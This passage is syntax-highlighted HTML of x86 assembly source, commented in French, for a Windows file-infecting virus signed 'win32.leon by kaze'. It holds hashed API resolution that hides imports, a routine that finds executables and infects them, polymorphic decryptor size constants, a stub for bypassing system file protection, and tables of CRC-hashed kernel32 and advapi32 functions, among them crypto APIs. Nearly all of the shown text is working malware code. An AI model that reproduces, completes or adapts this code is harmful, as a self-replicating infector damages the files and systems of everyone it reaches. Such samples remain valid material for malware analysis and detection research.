        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">lst_ord</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; choppe l'ordinal (marche en //)</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">lst_fnc</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; et on s'en sert pour chopper l'adresse de l'api</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                     </span><span class="sc1">; (RVA)</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">                           </span><span class="sc1">; on la stock</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                       </span><span class="sc1">; api suivante</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; esi==0xFFFFFFF ?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">fa3</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">fa1</span><span class="sc0">
</span><span class="sc5">fa3</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">find_apis</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;CALC_CRC: in: eax--&gt; apiname</span><span class="sc0">
</span><span class="sc1">;          out: eax=crc</span><span class="sc0">
</span><span class="sc5">calc_crc</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">cc1</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">cc2</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">cc1</span><span class="sc0">
</span><span class="sc5">cc2</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">calc_crc</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;INFECT_REP     in : none</span><span class="sc0">
</span><span class="sc1">;               out : none</span><span class="sc0">
</span><span class="sc5">infect_rep</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">WFD</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">mask</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;.exe</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">pas_premiere_gen</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mask_pg</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;kaze*.exe</span><span class="sc0">
</span><span class="sc5">pas_premiere_gen</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc5">call_</span><span class="sc0"> </span><span class="sc5">FindFirstFile</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">badrep</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Shandle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">unautreverre?</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">WFD_szFileName</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">sfc_protected</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">bypass_sfc</span><span class="sc0">
        </span><span class="sc1">; TODO : sfc check</span><span class="sc0">
</span><span class="sc5">bypass_sfc</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">infection</span><span class="sc0">
</span><span class="sc5">pas_touche</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">WFD</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Shandle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc5">call_</span><span class="sc0"> </span><span class="sc5">FindNextFile</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">;dernier fichier ?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">unautreverre?</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Shandle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc5">call_</span><span class="sc0"> </span><span class="sc5">FindClose</span><span class="sc0">
</span><span class="sc5">badrep</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">infect_rep</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;MAP_FILE :     in: edi=taille</span><span class="sc0">
</span><span class="sc1">;               out: none</span><span class="sc0">
</span><span class="sc5">map_file</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000002h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Mhandle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc5">call_</span><span class="sc0">    </span><span class="sc5">MVOFile</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">map_file</span><span class="sc0">         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;CREATE_MAPPED_FILE :   in : edi=taille</span><span class="sc0">
</span><span class="sc1">;                       out : none</span><span class="sc0">
</span><span class="sc5">create_mapped_file</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000004h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Fhandle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc5">call_</span><span class="sc0"> </span><span class="sc5">CreateFileMapping</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">create_mapped_file</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">make_thread</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0">           </span><span class="sc1">;esi--&gt; debut de la thread</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">vtmp1</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">vtmp2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CreateThread</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">make_thread</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">fin_dyn_fake_apis</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;======================================= DATA =================================</span><span class="sc0">

</span><span class="sc5">a_allouer</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">DECRYPTOR_SIZE</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">MUTATED_DECRYPTOR_SIZE</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">MAX_ENDROITS_INTERDIT</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">XOR_LOOP_SIZE</span><span class="sc0">
</span><span class="sc5">nb_a_allouer</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">a_allouer</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc0">

</span><span class="sc5">a_sauvegarder</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">ancien_ep</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">first_gen</span><span class="sc0">
</span><span class="sc5">imagebase</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">FIRST_GEN_IMAGE_BASE</span><span class="sc0">
</span><span class="sc5">a32_oft</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">a32_ft</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">locations</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">MAX_NB_PARTIES</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">infection_rva</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">poly_nb_parties_decrypteur</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">fake_apis</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">*</span><span class="sc5">NB_FAKE_APIS</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">nb_fake_apis</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">taille_sauvegarde</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">a_sauvegarder</span><span class="sc0">

</span><span class="sc5">RAND_SEED</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">45980131</span><span class="sc0">

</span><span class="sc5">signature</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"win32.leon by kaze"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">disque</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc13">"B:\",0
</span><span class="sc5">dmask</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"*"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">dotdot</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">".."</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">mask</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"kaze*.exe"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">mask_pg</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"kaze*.exe"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">name_user32</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'user32.dll'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">name_imagehlp</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'imagehlp.dll'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">imagehlp_api</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'CheckSumMappedFile'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">name_sfc</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'sfc.dll'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">sfc_api</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'SfcIsFileProtected'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">name_a32</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'ADVAPI32.DLL'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">msg</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Infecté'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">nb_fake_pushs</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">; pour reequilibrer la pile</span><span class="sc0">
</span><span class="sc5">cle_anti_call</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">35h</span><span class="sc0">


</span><span class="sc5">liste_apis_k32</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0FDBE9DDFh</span><span class="sc0">           </span><span class="sc1">; CloseHandle</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">04B00FBA1h</span><span class="sc0">           </span><span class="sc1">; CreateFileA</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00D6EA22Eh</span><span class="sc0">           </span><span class="sc1">; CreateFileMappingA</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0BE307C51h</span><span class="sc0">           </span><span class="sc1">; CreateThread</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">04E5DE044h</span><span class="sc0">           </span><span class="sc1">; ExitThread</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0BE7B8631h</span><span class="sc0">           </span><span class="sc1">; FindClose</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0C915738Fh</span><span class="sc0">           </span><span class="sc1">; FindFirstFileA</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">08851F43Dh</span><span class="sc0">           </span><span class="sc1">; FindNextFileA</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">028F8C6FBh</span><span class="sc0">           </span><span class="sc1">; GetCurrentDirectoryA</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">09C3A5210h</span><span class="sc0">           </span><span class="sc1">; GetDriveTypeA</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">06B1C08DAh</span><span class="sc0">           </span><span class="sc1">; GetFullPathNameA</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">040BF2F84h</span><span class="sc0">           </span><span class="sc1">; GetProcAddress</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">08FAF830Bh</span><span class="sc0">           </span><span class="sc1">; GetTickCount</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">05D0915E3h</span><span class="sc0">           </span><span class="sc1">; GetWindowsDirectoryA</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">095765835h</span><span class="sc0">           </span><span class="sc1">; LoadLibraryA</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">01064BF83h</span><span class="sc0">           </span><span class="sc1">; LocalAlloc</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">032BEDDC3h</span><span class="sc0">           </span><span class="sc1">; MapViewOfFile</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">09588EE13h</span><span class="sc0">           </span><span class="sc1">; MultiByteToWideChar</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">08E0E5487h</span><span class="sc0">           </span><span class="sc1">; SetCurrentDirectoryA</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">050665047h</span><span class="sc0">           </span><span class="sc1">; SetFileAttributesA</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">03A00E23Bh</span><span class="sc0">           </span><span class="sc1">; Sleep</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0FAE00D65h</span><span class="sc0">           </span><span class="sc1">; UnmapViewOfFile</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0065F101Ah</span><span class="sc0">           </span><span class="sc1">; VirtualProtect</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0FFFFFFFFh</span><span class="sc0">

</span><span class="sc5">liste_apis_u32</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0C0059B5Fh</span><span class="sc0">           </span><span class="sc1">; MessageBoxA</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0FFFFFFFFh</span><span class="sc0">

</span><span class="sc5">liste_apis_a32</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0B4060931h</span><span class="sc0">           </span><span class="sc1">; CryptAcquireContextA</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">08320BDFEh</span><span class="sc0">           </span><span class="sc1">; CryptCreateHash</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">01437CBF2h</span><span class="sc0">           </span><span class="sc1">; CryptDecrypt</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">09BB3B145h</span><span class="sc0">           </span><span class="sc1">; CryptDeriveKey</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0A6889767h</span><span class="sc0">           </span><span class="sc1">; CryptEncrypt</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0C66A7A58h</span><span class="sc0">           </span><span class="sc1">; CryptHashData</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0FFFFFFFFh</span><span class="sc0">

</span><span class="sc5">code_to_crypt_len</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">debut_virus</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">memoire</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">NB_CASES_MEMOIRE</span><span class="sc0">   </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">virus_len</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">debut_virus</span><span class="sc4">)</span><span class="sc0">


</span><span class="sc1">;======================================= BSS ==================================</span><span class="sc0">
</span><span class="sc9">align</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0">
</span><span class="sc1">; KERNEL32.DLL</span><span class="sc0">
</span><span class="sc5">apis_k32</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">CloseHandle</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">CreateFile</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">CreateFileMapping</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">CreateThread</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ExitThread</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">FindClose</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">FindFirstFile</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">FindNextFile</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">GetCurrentDirectory</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">GetDriveType</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">GetFullPathName</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">GetProcAddress</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">GetTickCount</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">GetWindowsDirectory</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">LoadLibrary</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">LocalAlloc</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">MVOFile</span><span class="sc0">                 </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">MultiByteToWideChar</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">SetCurrentDirectory</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
